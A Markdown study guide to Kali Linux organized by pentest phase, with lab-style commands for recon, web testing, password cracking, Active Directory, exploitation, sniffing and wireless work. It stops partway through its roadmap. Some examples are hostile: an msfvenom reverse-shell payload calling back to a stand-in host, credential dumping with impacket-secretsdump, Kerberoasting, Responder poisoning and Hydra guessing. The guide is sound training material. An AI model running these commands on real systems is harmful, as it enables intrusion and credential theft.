# Kali Linux Study Guide

A practical, lab-first guide to Kali Linux and the major pentesting tool families it ships with. Kali is not just "Linux with hacking tools". It is a purpose-built distribution for authorized penetration testing, security auditing, incident response, reverse engineering, wireless work, and forensics.

This guide was assembled on April 9, 2026 using the current Kali documentation, the official Kali metapackages page, and the official all-tools index. Kali ships with hundreds of packages, so the right way to study it is not to memorize every binary in one sitting. The right way is to understand:

1. what Kali is optimized for
2. how Kali groups tools into metapackages and workflows
3. which tools matter most in each phase of a pentest
4. how to practice safely in a lab

The examples below use lab targets, local hosts, or documentation-only networks such as `192.0.2.0/24` and `198.51.100.0/24`. Only use these tools on systems you own or have explicit written authorization to test.

---

## Quick Links

- Kali docs home: [https://www.kali.org/docs/](https://www.kali.org/docs/)
- All Kali tools: [https://www.kali.org/tools/all-tools/](https://www.kali.org/tools/all-tools/)
- Kali metapackages: [https://www.kali.org/docs/general-use/metapackages/](https://www.kali.org/docs/general-use/metapackages/)
- Should I Use Kali Linux?: [https://www.kali.org/docs/introduction/should-i-use-kali-linux/](https://www.kali.org/docs/introduction/should-i-use-kali-linux/)
- Updating Kali: [https://www.kali.org/docs/general-use/updating-kali/](https://www.kali.org/docs/general-use/updating-kali/)
- Kali sources list: [https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/](https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/)
- Which image should I download?: [https://www.kali.org/docs/introduction/what-image-to-download/](https://www.kali.org/docs/introduction/what-image-to-download/)

---

## Table of Contents

1. [What Kali Linux Actually Is](#1-what-kali-linux-actually-is)
2. [How Kali Organizes Its Tools](#2-how-kali-organizes-its-tools)
3. [How To Explore Kali Without Getting Lost](#3-how-to-explore-kali-without-getting-lost)
4. [Information Gathering and OSINT](#4-information-gathering-and-osint)
5. [Vulnerability Validation and Service Enumeration](#5-vulnerability-validation-and-service-enumeration)
6. [Web Application Testing](#6-web-application-testing)
7. [Password Attacks and Wordlists](#7-password-attacks-and-wordlists)
8. [Windows, Active Directory, and Post-Exploitation](#8-windows-active-directory-and-post-exploitation)
9. [Exploitation Frameworks and Exploit Research](#9-exploitation-frameworks-and-exploit-research)
10. [Sniffing, Spoofing, and Relay Attacks](#10-sniffing-spoofing-and-relay-attacks)
11. [Wireless, Bluetooth, RFID, SDR, and Hardware](#11-wireless-bluetooth-rfid-sdr-and-hardware)
12. [Reverse Engineering, Mobile, and Firmware](#12-reverse-engineering-mobile-and-firmware)
13. [Forensics, Incident Response, and Recovery](#13-forensics-incident-response-and-recovery)
14. [Cloud, Secrets, and Code-Focused Security Work](#14-cloud-secrets-and-code-focused-security-work)
15. [Social Engineering Tools](#15-social-engineering-tools)
16. [Reporting, Screenshots, and Team Workflow](#16-reporting-screenshots-and-team-workflow)
17. [A Good Kali Study Roadmap](#17-a-good-kali-study-roadmap)
18. [Documentation Hub](#18-documentation-hub)

---

## 1. What Kali Linux Actually Is

Kali is not meant to be a random "cool hacker OS". The official docs are very direct about this: Kali is specifically geared toward professional penetration testing and security auditing, and it is not recommended as a general-purpose distro if your main goal is gaming, office work, or casual Linux learning.

Three Kali design ideas matter immediately:

- **Network services are disabled by default**
  - This helps keep the system safer by default, even when you install server-like packages.
- **The kernel is customized for security work**
  - Kali uses an upstream kernel with patches useful for tasks such as wireless injection.
- **The repositories are intentionally strict**
  - Kali strongly discourages randomly adding PPAs or unrelated third-party repositories because they can break the system.

### When Kali is the right choice

- You want one distro with a large, curated security toolkit.
- You are studying penetration testing, wireless auditing, reverse engineering, DFIR, or offensive security workflows.
- You want official packaging for common security tools instead of maintaining dozens of manual installs.

### When Kali is not the right choice

- You are brand new to Linux and just want a daily driver.
- You expect every random desktop package repository to work cleanly.
- You want a stable non-security workstation first and a lab second.

### Best first setup

Use Kali in a VM before you install it bare metal. Snapshots are your friend. They turn "I broke the box" into "I learned something and rolled back".

Good first options:

- VirtualBox or VMware image
- WSL if you mostly want CLI tooling
- A dedicated lab laptop or external SSD
- A live USB only for quick field work, not for deep study

### First commands to know

```bash
sudo apt update
sudo apt full-upgrade -y
sudo apt install -y kali-linux-default
```

If you want a smaller, more focused build:

```bash
sudo apt install -y kali-tools-web kali-tools-passwords kali-tools-wireless
```

And if you want a menu-driven way to add tool groups:

```bash
kali-tweaks
```

---

## 2. How Kali Organizes Its Tools

Kali uses **metapackages**. A metapackage is basically a bundle that pulls in a whole tool family. This matters because you do not need `kali-linux-everything` on day one. You can install just the parts that match what you are studying.

### Core Kali metapackages

| Metapackage | What it means |
|---|---|
| `kali-linux-core` | Minimal base system |
| `kali-linux-headless` | CLI-first system without GUI expectations |
| `kali-linux-default` | Default desktop image toolset |
| `kali-linux-large` | Larger tool selection |
| `kali-linux-everything` | Nearly everything Kali ships |
| `kali-linux-labs` | Practice/lab resources |

### Official workflow-oriented metapackages

These are the categories most people mean when they say "all the pentesting tools in Kali".

| Metapackage | Focus | Think of it as |
|---|---|---|
| `kali-tools-information-gathering` | Recon, OSINT, network mapping | "What is out there?" |
| `kali-tools-vulnerability` | Validation and vuln checks | "What looks weak?" |
| `kali-tools-web` | Web app testing | "What can I learn or break in HTTP land?" |
| `kali-tools-database` | DB-focused testing | "How do I talk to or abuse databases?" |
| `kali-tools-passwords` | Cracking and online guessing | "Can I recover or guess credentials?" |
| `kali-tools-wireless` | Wi-Fi, Bluetooth, RFID, SDR | "What is happening off the wire?" |
| `kali-tools-reverse-engineering` | Binaries, malware, decompilation | "What does this program really do?" |
| `kali-tools-exploitation` | Exploit frameworks and helpers | "Can I turn weakness into access?" |
| `kali-tools-social-engineering` | User-targeted attack simulations | "How do human factors affect security?" |
| `kali-tools-sniffing-spoofing` | MITM, packet capture, impersonation | "Can I observe or manipulate traffic?" |
| `kali-tools-post-exploitation` | AD, privilege escalation, lateral movement | "Now that I am in, what next?" |
| `kali-tools-forensics` | DFIR and evidence recovery | "What happened here?" |
| `kali-tools-reporting` | Reporting, screenshots, collaboration | "How do I prove what I found?" |

### Specialized Kali metapackages

These matter once you go beyond general web/network pentesting.

| Metapackage | Focus | Example areas |
|---|---|---|
| `kali-tools-gpu` | GPU-accelerated work | Hash cracking |
| `kali-tools-hardware` | Hardware hacking | USB, embedded, custom interfaces |
| `kali-tools-crypto-stego` | Cryptography and stego | Hidden data, encoded artifacts |
| `kali-tools-fuzzing` | Protocol/app fuzzing | Crash discovery, parser edge cases |
| `kali-tools-802-11` | Wi-Fi-specific tooling | Monitor mode, captures, AP analysis |
| `kali-tools-bluetooth` | Bluetooth tooling | BLE discovery and analysis |
| `kali-tools-rfid` | RFID and badge work | Proxmark workflows |
| `kali-tools-sdr` | Software-defined radio | RF analysis |
| `kali-tools-voip` | SIP/VoIP security | Telephony testing |
| `kali-tools-windows-resources` | Windows-side resources | Client-side or host-side tooling |

### The smart way to study Kali

Do not study it like this:

- "Today I will memorize 600 package names."

Study it like this:

1. Learn one workflow.
2. Learn the 3-8 tools that dominate that workflow.
3. Learn how the tool output feeds the next step.
4. Learn how to write the finding up.

That is exactly how the rest of this guide is organized.

---

## 3. How To Explore Kali Without Getting Lost

Kali becomes much easier once you stop relying only on the desktop menu.

### Useful discovery habits

```bash
apt search nmap
apt show kali-tools-web
man nmap
nmap --help
dpkg -L seclists | less
ls /usr/share/wordlists
ls /usr/share/seclists
```

### Important directories

| Path | Why it matters |
|---|---|
| `/usr/share/wordlists/` | Built-in wordlists |
| `/usr/share/seclists/` | Large curated attack lists and discovery lists |
| `/usr/share/doc/` | Package documentation and examples |
| `/usr/bin/` | Most command-line tools |
| `/usr/share/kali-defaults/` | Helpful Kali defaults and desktop integration |

### A simple "learn any tool" pattern

When you discover a new tool in Kali, ask:

1. What problem does it solve?
2. Is it passive, active, or exploitative?
3. What input does it need?
4. What output does it produce?
5. What tool usually comes before it?
6. What tool usually comes after it?

Example with `nmap`:

- Before `nmap`: target definition, scope, maybe passive DNS
- During `nmap`: ports, services, versions, scripts
- After `nmap`: web tools, SMB tools, exploit lookup, reporting

That is a Kali mindset: tools are part of a chain, not isolated tricks.

---

## 4. Information Gathering and OSINT

This is where most good assessments begin. The goal is not just "find hosts". The goal is to build a believable model of the target surface.

### Typical questions in this phase

- What domains and subdomains exist?
- What IPs, ports, and services are exposed?
- What technologies are in use?
- What clues are publicly available?

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [Nmap](https://www.kali.org/tools/nmap/) | Network mapping, service detection, NSE scripts | `nmap -sV -Pn -oA edge-scan 192.0.2.10` |
| [Masscan](https://www.kali.org/tools/masscan/) | Very fast port scanning | `sudo masscan 192.0.2.0/24 -p1-1000 --rate 1000` |
| [Amass](https://www.kali.org/tools/amass/) | Passive and active external recon | `amass enum -passive -d example.com -o amass.txt` |
| [theHarvester](https://www.kali.org/tools/theharvester/) | Emails, hosts, names from public sources | `theHarvester -d example.com -b bing,crtsh` |
| [Subfinder](https://www.kali.org/tools/subfinder/) | Fast passive subdomain discovery | `subfinder -d example.com -silent` |
| [Assetfinder](https://www.kali.org/tools/assetfinder/) | Quick domain-related discovery | `assetfinder --subs-only example.com` |
| [dnsrecon](https://www.kali.org/tools/dnsrecon/) | DNS enumeration | `dnsrecon -d example.com` |
| [dnsenum](https://www.kali.org/tools/dnsenum/) | DNS and subdomain enumeration | `dnsenum example.com` |
| [Recon-ng](https://www.kali.org/tools/recon-ng/) | Modular recon workspace | `recon-ng` |
| [SpiderFoot](https://www.kali.org/tools/spiderfoot/) | Automated OSINT correlations | `spiderfoot -l 127.0.0.1:5001` |
| [httpx-toolkit](https://www.kali.org/tools/httpx-toolkit/) | Validate which discovered hosts are actually speaking HTTP(S) | `httpx-toolkit -l hosts.txt -title -tech-detect` |
| [WhatWeb](https://www.kali.org/tools/whatweb/) | Fingerprint web technologies | `whatweb http://192.0.2.10` |

### Mini-workflow example

Imagine you are assessing a lab domain called `example.com`.

```bash
subfinder -d example.com -silent > subs.txt
amass enum -passive -d example.com >> subs.txt
sort -u subs.txt > unique-subs.txt
httpx-toolkit -l unique-subs.txt -title -tech-detect -o live-http.txt
nmap -sV -Pn -iL resolved-ips.txt -oA perimeter
```

### What to learn here

- Difference between passive and active recon
- DNS records and subdomain sprawl
- Why validation matters after discovery
- Why "port open" is not the same thing as "interesting"

### Upstream docs worth bookmarking

- Nmap reference guide: [https://nmap.org/book/man.html](https://nmap.org/book/man.html)

---

## 5. Vulnerability Validation and Service Enumeration

Recon tells you what is there. This phase tells you what deserves attention.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [Nuclei](https://www.kali.org/tools/nuclei/) | Template-based checks for known exposures | `nuclei -u http://192.0.2.10` |
| [Nikto](https://www.kali.org/tools/nikto/) | Quick web server misconfiguration checks | `nikto -h http://192.0.2.10` |
| [sslscan](https://www.kali.org/tools/sslscan/) | TLS configuration review | `sslscan 192.0.2.10:443` |
| [testssl.sh](https://www.kali.org/tools/testssl.sh/) | Deep TLS and HTTPS testing | `testssl 192.0.2.10:443` |
| [enum4linux-ng](https://www.kali.org/tools/enum4linux-ng/) | SMB/Windows host enumeration | `enum4linux-ng -A 192.0.2.20` |
| [smbclient](https://www.kali.org/tools/samba/) | Browse shares and test SMB access | `smbclient -L //192.0.2.20 -N` |
| [rpcclient](https://www.kali.org/tools/samba/) | Query Windows/Samba RPC interfaces | `rpcclient -U \"\" -N 192.0.2.20` |
| [ldapdomaindump](https://www.kali.org/tools/python-ldapdomaindump/) | Dump LDAP/AD structure for review | `ldapdomaindump ldap://192.0.2.30 -u 'lab\\\\user' -p 'Password123!'` |

### Mini-workflow example

You scanned a host and found `80`, `443`, `445`, and `389`.

```bash
nikto -h http://192.0.2.20
nuclei -u https://192.0.2.20
sslscan 192.0.2.20:443
enum4linux-ng -A 192.0.2.20
smbclient -L //192.0.2.20 -N
```

### What to learn here

- Validate findings instead of blindly trusting scanners
- Understand false positives and noisy results
- Learn protocol-specific enumeration habits
- Keep raw output because it becomes report evidence later

---

## 6. Web Application Testing

Kali is extremely strong for web work. This is where many people spend most of their time because web apps give you breadth: HTTP, auth, sessions, APIs, files, SSRF, deserialization, and more.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [Burp Suite](https://www.kali.org/tools/burpsuite/) | Intercepting proxy and manual testing platform | `burpsuite` |
| [OWASP ZAP](https://www.kali.org/tools/zaproxy/) | Proxy, active scan, automation | `zaproxy` |
| [Gobuster](https://www.kali.org/tools/gobuster/) | Directory, vhost, DNS brute forcing | `gobuster dir -u http://192.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt` |
| [ffuf](https://www.kali.org/tools/ffuf/) | Fast content and parameter fuzzing | `ffuf -u http://192.0.2.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt` |
| [Wfuzz](https://www.kali.org/tools/wfuzz/) | Flexible web fuzzing | `wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://192.0.2.10/FUZZ` |
| [Feroxbuster](https://www.kali.org/tools/feroxbuster/) | Recursive content discovery | `feroxbuster -u http://192.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt` |
| [dirsearch](https://www.kali.org/tools/dirsearch/) | Web path enumeration | `dirsearch -u http://192.0.2.10` |
| [WhatWeb](https://www.kali.org/tools/whatweb/) | Tech fingerprinting | `whatweb http://192.0.2.10` |
| [sqlmap](https://www.kali.org/tools/sqlmap/) | SQL injection testing and exploitation in labs | `sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --batch` |

### Mini-scenario

Suppose you are testing a training target and want to understand the app before you attack it:

```bash
whatweb http://192.0.2.10
gobuster dir -u http://192.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://192.0.2.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
burpsuite
```

### How to think in this phase

- Proxy first, automate second
- Learn the app manually before you trust a scanner
- Separate content discovery from vulnerability validation
- Keep screenshots, requests, and reproduction steps

### Upstream docs worth bookmarking

- Burp Suite docs: [https://portswigger.net/burp/documentation](https://portswigger.net/burp/documentation)
- OWASP ZAP docs: [https://www.zaproxy.org/docs/](https://www.zaproxy.org/docs/)

---

## 7. Password Attacks and Wordlists

Credential work is a huge part of Kali. Sometimes you are cracking offline hashes. Sometimes you are testing password reuse. Sometimes you are building custom wordlists from the target itself.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [Hashcat](https://www.kali.org/tools/hashcat/) | GPU-friendly offline cracking | `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt` |
| [John](https://www.kali.org/tools/john/) | Flexible offline cracking and format conversion helpers | `john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` |
| [Hydra](https://www.kali.org/tools/hydra/) | Online login guessing in labs | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.0.2.20` |
| [CeWL](https://www.kali.org/tools/cewl/) | Build wordlists from website content | `cewl http://192.0.2.10 -w custom.txt` |
| [Crunch](https://www.kali.org/tools/crunch/) | Generate candidate passwords by pattern | `crunch 8 8 abc123 -o candidates.txt` |
| [SecLists](https://www.kali.org/tools/seclists/) | Curated lists for wordlists, fuzzing, usernames, paths | `ls /usr/share/seclists` |
| [aircrack-ng](https://www.kali.org/tools/aircrack-ng/) | Wi-Fi key cracking and capture utilities | `aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt` |
| [hcxtools](https://www.kali.org/tools/hcxtools/) | Convert Wi-Fi captures for Hashcat | `hcxpcapngtool -o hashes.22000 capture.pcapng` |

### Mini-workflow example

```bash
cewl http://intranet.lab -w target-words.txt
cat /usr/share/wordlists/rockyou.txt target-words.txt | sort -u > merged.txt
john hashes.txt --wordlist=merged.txt
```

### What to learn here

- Online versus offline attacks
- Why rate limits matter
- Why custom wordlists often beat giant generic lists
- How to identify hash types before you crack them

### Upstream docs worth bookmarking

- Hashcat wiki: [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
- John jumbo docs: [https://www.openwall.com/john/doc/](https://www.openwall.com/john/doc/)

---

## 8. Windows, Active Directory, and Post-Exploitation

Kali is now very strong for AD and Windows-centric work. This is one of the biggest reasons modern security teams keep Kali around even when they run many other distros.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [NetExec](https://www.kali.org/tools/netexec/) | Modern network execution and AD-aware enumeration | `netexec smb 192.0.2.30 -u analyst -p 'Password123!'` |
| [CrackMapExec](https://www.kali.org/tools/crackmapexec/) | Older but still common CME workflow | `crackmapexec smb 192.0.2.30 -u analyst -p 'Password123!'` |
| [Impacket](https://www.kali.org/tools/impacket/) | AD and Windows protocol tooling | `impacket-secretsdump lab.local/analyst:Password123!@192.0.2.10` |
| [Impacket scripts](https://www.kali.org/tools/impacket-scripts/) | Kerberos, SMB, MSSQL, NTLM relay, remote exec | `impacket-GetUserSPNs lab.local/analyst:Password123! -dc-ip 192.0.2.10 -request` |
| [BloodHound CE Python](https://www.kali.org/tools/bloodhound-ce-python/) | Collect AD relationship data for BloodHound | `bloodhound-ce-python -d lab.local -u analyst -p 'Password123!' -ns 192.0.2.10 -c all` |
| [BloodHound](https://www.kali.org/tools/bloodhound/) | Graph AD relationships | `bloodhound` |
| [Certipy-ad](https://www.kali.org/tools/certipy-ad/) | AD CS and certificate abuse analysis | `certipy-ad find -u analyst@lab.local -p 'Password123!' -dc-ip 192.0.2.10` |
| [enum4linux-ng](https://www.kali.org/tools/enum4linux-ng/) | Quick SMB/Windows enumeration | `enum4linux-ng -A 192.0.2.30` |
| [ldapdomaindump](https://www.kali.org/tools/python-ldapdomaindump/) | Dump LDAP domain structure | `ldapdomaindump ldap://192.0.2.10 -u 'lab\\\\analyst' -p 'Password123!'` |
| [evil-winrm-py](https://www.kali.org/tools/evil-winrm-py/) | WinRM access in labs | `evil-winrm-py -i 192.0.2.30 -u analyst -p 'Password123!'` |
| [Responder](https://www.kali.org/tools/responder/) | LLMNR/NBT-NS poisoning and credential capture in an isolated lab | `sudo responder -I eth0` |

### Mini-workflow example

```bash
enum4linux-ng -A 192.0.2.30
netexec smb 192.0.2.30 -u analyst -p 'Password123!'
impacket-GetUserSPNs lab.local/analyst:Password123! -dc-ip 192.0.2.10 -request
bloodhound-ce-python -d lab.local -u analyst -p 'Password123!' -ns 192.0.2.10 -c all
```

### What to learn here

- SMB, LDAP, Kerberos, WinRM, and MSSQL as separate protocol surfaces
- Why AD is mostly about relationships, not just credentials
- How enumeration becomes path analysis
- Why almost every AD finding needs careful proof and careful scope handling

---

## 9. Exploitation Frameworks and Exploit Research

This is the part many beginners jump to first, but it makes the most sense after recon and validation.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [ExploitDB / Searchsploit](https://www.kali.org/tools/exploitdb/) | Local exploit research against discovered versions | `searchsploit apache 2.4` |
| [Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) | Exploit framework, payloads, sessions, scanners | `msfconsole` |
| [msfvenom](https://www.kali.org/tools/metasploit-framework/) | Payload generation in labs | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.0.2.50 LPORT=4444 -f elf -o payload.elf` |
| [sqlmap](https://www.kali.org/tools/sqlmap/) | Exploit verified SQLi in training apps | `sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1' --batch` |
| [Pacu](https://www.kali.org/tools/pacu/) | AWS exploitation and auditing framework | `pacu` |

### Mini-workflow example

You used `nmap` and saw a version string. Now validate and research before you touch Metasploit:

```bash
searchsploit openssh 8
msfconsole
```

### Metasploit concepts worth mastering

- Workspaces
- Auxiliary modules
- Exploit modules
- Payloads
- Sessions
- Loot
- Post modules

### Upstream docs worth bookmarking

- Metasploit docs: [https://docs.metasploit.com/](https://docs.metasploit.com/)

---

## 10. Sniffing, Spoofing, and Relay Attacks

This is where Kali feels like a true network security platform. You capture traffic, inspect protocols, manipulate paths, and observe what systems trust by default.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [tcpdump](https://www.kali.org/tools/tcpdump/) | Fast packet capture from the shell | `sudo tcpdump -i eth0 -nn host 192.0.2.10` |
| [Wireshark / Tshark](https://www.kali.org/tools/wireshark/) | Deep packet inspection and filtered analysis | `tshark -r capture.pcapng` |
| [Bettercap](https://www.kali.org/tools/bettercap/) | MITM, proxying, sniffing, network manipulation | `sudo bettercap -iface eth0` |
| [Ettercap](https://www.kali.org/tools/ettercap/) | MITM and protocol-aware interception | `sudo ettercap -T -M arp:remote /192.0.2.10// /192.0.2.1//` |
| [Responder](https://www.kali.org/tools/responder/) | Name resolution poisoning in Windows labs | `sudo responder -I eth0` |
| [netsniff-ng](https://www.kali.org/tools/netsniff-ng/) | High-performance sniffing and traffic generation | `sudo netsniff-ng -i eth0` |

### Mini-scenario

You want to understand what a chatty lab subnet is doing before you choose a next step:

```bash
sudo tcpdump -i eth0 -nn net 192.0.2.0/24
wireshark
```

### What to learn here

- Capture filters versus display filters
- Broadcast, multicast, ARP, DNS, and name resolution behavior
- Why relay-style attacks depend on trust paths, not just packets
- Why lab isolation matters for these tools more than almost any other category

### Upstream docs worth bookmarking

- Wireshark docs: [https://www.wireshark.org/docs/](https://www.wireshark.org/docs/)

---

## 11. Wireless, Bluetooth, RFID, SDR, and Hardware

This is one of Kali's signature strengths. Many distros can run web or Nmap tooling. Fewer are packaged and tuned for wireless injection, RF work, or badge tooling.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [aircrack-ng](https://www.kali.org/tools/aircrack-ng/) | Wi-Fi capture, injection, cracking helpers | `sudo airmon-ng start wlan0` |
| [hcxtools](https://www.kali.org/tools/hcxtools/) | Convert modern Wi-Fi captures for cracking | `hcxpcapngtool -o hashes.22000 capture.pcapng` |
| [Kismet](https://www.kali.org/tools/kismet/) | Wireless discovery and multi-source capture | `kismet` |
| [Wifite](https://www.kali.org/tools/wifite/) | Guided Wi-Fi auditing workflow in labs | `sudo wifite` |
| [Reaver](https://www.kali.org/tools/reaver/) | WPS auditing in labs | `reaver -i wlan0mon -b 00:11:22:33:44:55` |
| [Bully](https://www.kali.org/tools/bully/) | Alternative WPS auditing tool | `bully wlan0mon -b 00:11:22:33:44:55` |
| [Blue Hydra](https://www.kali.org/tools/blue-hydra/) | Bluetooth and BLE discovery | `blue_hydra` |
| [Proxmark3](https://www.kali.org/tools/proxmark3/) | RFID and badge research | `proxmark3` |
| [gqrx-sdr](https://www.kali.org/tools/gqrx-sdr/) | SDR signal visualization | `gqrx` |
| [wifipumpkin3](https://www.kali.org/tools/wifipumpkin3/) | Rogue AP lab framework | `sudo wifipumpkin3` |

### Wi-Fi mini-workflow example

Only do this against your own AP or an explicit wireless lab:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcapngtool -o hashes.22000 capture.pcapng
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
```

### What to learn here

- Monitor mode
- Capture hygiene
- Difference between discovery, deauth, capture conversion, and cracking
- Why hardware compatibility matters much more in wireless than in web testing

---

## 12. Reverse Engineering, Mobile, and Firmware

Kali is not only for network attacks. It is also strong for understanding binaries, APKs, and firmware images.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [Ghidra](https://www.kali.org/tools/ghidra/) | GUI reverse engineering suite | `ghidra` |
| [radare2](https://www.kali.org/tools/radare2/) | Powerful terminal-first reverse engineering | `r2 suspicious.bin` |
| [Rizin](https://www.kali.org/tools/rizin/) | Modern RE framework fork | `rizin suspicious.bin` |
| [Cutter](https://www.kali.org/tools/rizin-cutter/) | GUI for Rizin workflows | `cutter` |
| [gdb](https://www.kali.org/tools/gdb/) | Native debugging | `gdb ./vuln` |
| [jadx](https://www.kali.org/tools/jadx/) | Android decompiler | `jadx-gui app.apk` |
| [apktool](https://www.kali.org/tools/apktool/) | Decode and rebuild APK resources | `apktool d app.apk -o app-src` |
| [binwalk](https://www.kali.org/tools/binwalk/) | Firmware analysis and extraction | `binwalk -e firmware.bin` |
| [binwalk3](https://www.kali.org/tools/binwalk3/) | Next-generation Rust implementation | `binwalk3 firmware.bin` |

### Mini-scenario

You download a firmware blob from a vendor support page and want to know what is inside:

```bash
binwalk -e firmware.bin
strings firmware.bin | less
ghidra
```

### What to learn here

- Static versus dynamic analysis
- GUI-first versus terminal-first RE workflows
- Android resource decoding versus Java/Kotlin decompilation
- Why firmware is often just many smaller file systems and archives glued together

### Upstream docs worth bookmarking

- Ghidra docs: [https://ghidra-sre.org/](https://ghidra-sre.org/)

---

## 13. Forensics, Incident Response, and Recovery

Kali is also a DFIR box. If you only associate it with offense, you are missing a big part of what it can do.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [Autopsy](https://www.kali.org/tools/autopsy/) | GUI forensic analysis | `autopsy` |
| [Sleuth Kit](https://www.kali.org/tools/sleuthkit/) | File system and disk image analysis | `mmls disk.img` |
| [bulk-extractor](https://www.kali.org/tools/bulk-extractor/) | Recover structured artifacts from images | `bulk_extractor -o be-out disk.img` |
| [YARA](https://www.kali.org/tools/yara/) | Pattern-based artifact matching | `yara -r rules.yar samples/` |
| [Plaso](https://www.kali.org/tools/plaso/) | Timeline generation | `plaso-log2timeline timeline.plaso disk.img` |
| [Foremost](https://www.kali.org/tools/foremost/) | File carving | `foremost -i disk.img -o foremost-out` |
| [Scalpel](https://www.kali.org/tools/scalpel/) | File carving | `scalpel disk.img -o scalpel-out` |
| [TestDisk / PhotoRec](https://www.kali.org/tools/testdisk/) | Partition recovery and file recovery | `testdisk disk.img` |
| [binwalk](https://www.kali.org/tools/binwalk/) | Embedded and firmware artifact extraction | `binwalk -e firmware.bin` |

### Mini-workflow example

```bash
mmls disk.img
fls -r -m / disk.img > bodyfile.txt
mactime -b bodyfile.txt > timeline.txt
bulk_extractor -o artifacts disk.img
yara -r rules.yar recovered/
```

### What to learn here

- Timeline thinking
- Metadata versus content
- Recovery versus analysis
- Why "found on disk" is not the same as "executed"

---

## 14. Cloud, Secrets, and Code-Focused Security Work

Modern pentesting often includes cloud accounts, public buckets, CI/CD leaks, and secret scanning. Kali has enough tooling here to be useful even if your target is mostly code and cloud.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [cloud-enum](https://www.kali.org/tools/cloud-enum/) | Search for public cloud naming exposures | `cloud_enum -k companyname` |
| [Pacu](https://www.kali.org/tools/pacu/) | AWS-focused exploitation and audit framework | `pacu` |
| [gitleaks](https://www.kali.org/tools/gitleaks/) | Secret scanning in code repos | `gitleaks detect -s ./repo` |
| [trufflehog](https://www.kali.org/tools/trufflehog/) | Secret discovery across repos and file systems | `trufflehog filesystem ./repo` |
| [httpx-toolkit](https://www.kali.org/tools/httpx-toolkit/) | Validate exposed HTTP assets quickly | `httpx-toolkit -l assets.txt -title -tech-detect` |

### Mini-scenario

You have permission to review an internal app repo and its cloud footprint:

```bash
gitleaks detect -s ./repo
trufflehog filesystem ./repo
cloud_enum -k companyname
```

### What to learn here

- Secret scanning before exploitation
- Asset validation before cloud testing
- Why cloud assessments require extremely careful scope control

---

## 15. Social Engineering Tools

Kali includes social engineering tooling, but this is where ethical boundaries and authorization matter the most. Use these only in awareness training, explicit red team exercises, or isolated local labs.

### Key tools to know

| Tool | What it is for | Starter command |
|---|---|---|
| [SET / Social-Engineer Toolkit](https://www.kali.org/tools/set/) | Guided social engineering simulations | `setoolkit` |
| [BeEF-XSS](https://www.kali.org/tools/beef-xss/) | Browser exploitation framework for labs | `beef-xss` |
| [evilginx2](https://www.kali.org/tools/evilginx2/) | Phishing simulation framework for authorized exercises only | `evilginx2` |
| [wifipumpkin3](https://www.kali.org/tools/wifipumpkin3/) | Rogue AP lab framework | `sudo wifipumpkin3` |

### How to study this safely

- Focus on defenses and awareness outcomes, not just the offensive mechanics
- Practice only in isolated labs
- Document pre-approval, scope, and success criteria before any real engagement

---

## 16. Reporting, Screenshots, and Team Workflow

A pentest is not complete when you "get a shell". It is complete when you can explain the risk, prove the path, show impact, and recommend a fix.

### Key tools to learn

| Tool | What it is for | Lab-style example |
|---|---|---|
| [EyeWitness](https://www.kali.org/tools/eyewitness/) | Screenshot web services and management portals | `eyewitness --web -f urls.txt` |
| [GoWitness](https://www.kali.org/tools/gowitness/) | Fast screenshots and visual asset review | `gowitness scan file -f urls.txt` |
| [WitnessMe](https://www.kali.org/tools/witnessme/) | Screenshot and asset evidence collection | `witnessme -f urls.txt` |
| [Faraday](https://www.kali.org/tools/python-faraday/) | Collaborative security workspace and reporting | `faraday-server` |

### Reporting mindset

For every real finding, capture:

- affected asset
- proof of access or proof of weakness
- exact steps to reproduce
- screenshots or raw output
- business impact
- remediation advice

If you cannot explain the finding clearly, you probably do not understand it deeply enough yet.

---

## 17. A Good Kali Study Roadmap

Here is a realistic way to learn Kali without drowning in it.

### Stage 1: Learn Kali itself

Goals:

- Update the system correctly
- Install metapackages
- Use `man`, `--help`, and `/usr/share/seclists`
- Work in snapshots

Practice:

```bash
sudo apt update
sudo apt full-upgrade -y
sudo apt install -y kali-tools-information-gathering kali-tools-web
```

### Stage 2: Learn recon and validation

Master first:

- `nmap`
- `amass`
- `subfinder`
- `httpx-toolkit`
- `whatweb`
- `nuclei`

Target mindset:

- Build asset inventory
- Confirm what is live
- Avoid noisy guessing before you understand the surface

### Stage 3: Learn web testing

Master first:

- `burpsuite`
- `zaproxy`
- `gobuster`
- `ffuf`
- `sqlmap`

Practice targets:

- OWASP Juice Shop
- DVWA
- Other intentionally vulnerable web labs you control

### Stage 4: Learn passwords and AD

Master first:

- `hashcat`
- `john`
- `netexec`
- `impacket`
- `bloodhound-ce-python`
- `certipy-ad`

